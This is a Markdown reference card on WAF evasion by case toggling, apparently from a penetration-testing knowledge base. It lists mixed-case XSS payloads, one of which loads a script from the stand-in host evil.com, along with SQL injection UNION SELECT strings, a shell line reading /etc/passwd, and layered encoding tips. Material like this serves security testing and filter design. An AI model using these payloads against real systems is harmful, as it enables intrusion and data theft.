---
id: WAF-EVASION-03
title: Case Toggling
category: Evasion Techniques
severity_range: Low-Medium
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-03: Case Toggling

## Summary

Case toggling exploits case-sensitive regular expressions in WAF filters by varying the letter casing of keywords, function names, and tag identifiers. Many WAF rule sets only match against lowercase or a specific case pattern, allowing mixed-case or all-uppercase variants to pass through undetected.

## When to Use

- Against WAFs with case-sensitive regex rules
- When the WAF normalizes input but the regex was written for a specific case
- As a quick first-pass test to identify filter boundaries before employing more complex evasion
- Against WAFs that use simple string matching rather than case-insensitive patterns

## Technique Details

WAF regex patterns often target lowercase keywords for performance or simplicity. By toggling the case of individual characters, attackers can produce valid syntax that the target parser (browser, SQL engine, shell) still interprets correctly, but the WAF regex fails to match.

**HTML/JavaScript case toggling:**

HTML tags are not case-sensitive, and JavaScript identifiers can be case-toggled as long as they maintain valid references. Event handlers like `onclick`, `onerror` are also parsed case-insensitively by browsers.

**SQL keyword case toggling:**

SQL keywords are case-insensitive in most database engines. Toggling the case of `SELECT`, `UNION`, `WHERE`, etc. preserves functionality while evading filters that target specific case patterns.

## Payload Examples

```html
<!-- HTML/JavaScript case toggling -->
<ScRipT>alert(1)</sCRipT>
<Script>alert(1)</SCript>
<sCrIpT sRc="//evil.com/xss.js"></sCrIpT>
<img SrC=x OnErRoR=alert(1)>
<BODY onLoAd=alert(1)>
<SVG OnLoAd=alert(1)>
```

```sql
-- SQL keyword case toggling
UnIoN SeLeCt 1,2,3 FrOm users
UnIoN/**/SeLeCt/**/1,2,3/**/FrOm/**/users
uNiOn sElEcT 1,2,3 fRoM users
SeLeCt * FrOm users WhErE iD=1
```

```bash
# Shell command case toggling (if filesystem is case-insensitive)
/CaT /eTc/PaSsWd
/CaT /eTc/*.conf
```

```python
# Python function case toggling (imports are case-sensitive)
# Not applicable in most cases - Python identifiers are case-sensitive
```

## Detection & Bypass Notes

**Detection:**
- WAFs that normalize input to lowercase before regex matching are immune to simple case toggling.
- Behavioral WAFs that evaluate the semantic structure (AST-based analysis) rather than raw text are not fooled.
- Case toggling can trigger anomaly detection if mixed case is statistically unusual in the request stream.

**Bypass:**
- Combine with comment insertion for multi-layer evasion: `un/**/ion sel/**/ect`
- Use case toggling as a preliminary reconnaissance step to gauge filter strictness.
- Layer with URL encoding: `%3CsCrIpT%3Ealert(1)%3C%2FsCrIpT%3E`
- Test all possible casing permutations against API endpoints (some have different WAF profiles per endpoint).

## References

- https://github.com/0xInfection/Awesome-WAF
- https://owasp.org/www-community/attacks/xss/
- https://portswigger.net/web-security/sql-injection
